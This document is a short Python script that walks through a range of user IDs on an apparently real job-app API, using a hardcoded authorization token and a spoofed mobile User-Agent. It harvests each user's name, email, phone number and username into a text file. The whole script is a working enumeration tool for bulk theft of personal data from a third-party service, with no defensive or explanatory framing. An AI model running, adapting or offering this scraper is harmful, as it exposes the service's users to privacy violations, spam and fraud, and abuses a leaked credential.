import grequests

range1 = int(input("Enter Starting Number : "))
range2 = int(input("Enter Ending Number   : "))
urls,tab = [],"\t"
mn_url = "http://rozgarapi.appx.co.in/get/get_user_dt?userid="
for i in range(range1,range2):urls.append(str(mn_url+str(i)))
print("Url Done")

headers = {'Authorization': '13YjoB7buXUpA','Auth-Key': 'appxapi','Host': 'rozgarapi.appx.co.in','User-Agent': 'okhttp/3.12.12'}
req = (grequests.get(u,headers=headers,timeout=3) for u in urls)
data = grequests.map(req)
with open("Rojagar_Ankit_1.txt","a") as f:
    for i in data:
        try:
            i = i.json()
            m_dta = str(i['data'][0]['id']+tab+i['data'][0]['name']+tab+i['data'][0]['email']+tab+i['data'][0]['phone']+tab+i['data'][0]['username']+"\n")
            f.write(m_dta)
        except: pass
print("Done")
